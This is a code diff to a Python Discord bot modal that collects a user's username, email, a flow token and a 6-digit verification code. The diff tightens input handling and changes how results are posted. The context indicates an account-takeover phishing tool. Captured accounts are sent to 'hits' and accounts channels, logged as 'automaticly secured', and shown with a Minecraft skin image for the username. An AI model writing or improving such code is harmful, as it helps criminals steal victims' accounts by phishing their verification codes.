@@ -18,20 +18,10 @@ class MyModalTwo(ui.Modal):
         self.username = username
         self.email = email
         self.flowtoken = flowtoken
-        self.add_item(ui.InputText(label="Code", required=True))
+        self.add_item(ui.InputText(label="Code", required=True, max_length=6))
 
     async def callback(self, interaction: discord.Interaction) -> None:
         code = self.children[0].value
-
-        if len(str(code)) != 6:
-            await interaction.response.send_message(
-                embed = discord.Embed(
-                    description = "The code must be 6 digits long."
-                ),
-                color = 0xFF5C5C,
-                ephemeral=True
-            )
-            return  
 
         logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
         hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
@@ -43,7 +33,7 @@ class MyModalTwo(ui.Modal):
             colour = 0x79D990,                           
         ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username}")
 
-        await interaction.response.defer()
+        await interaction.response.defer(ephemeral=True)
 
         await logs_channel.send("**This Account is being automaticly secured**")
         await logs_channel.send(embed = Code_embed, view = ButtonOptions(interaction.user.id))
@@ -74,7 +64,6 @@ class MyModalTwo(ui.Modal):
         await hits_channel.send(
             embed = securedAccount["hit_embed"],
             view = accountInfo(
-                securedAccount["details"], 
-                interaction.user
-                )
+                securedAccount["details"]
+            )
         )
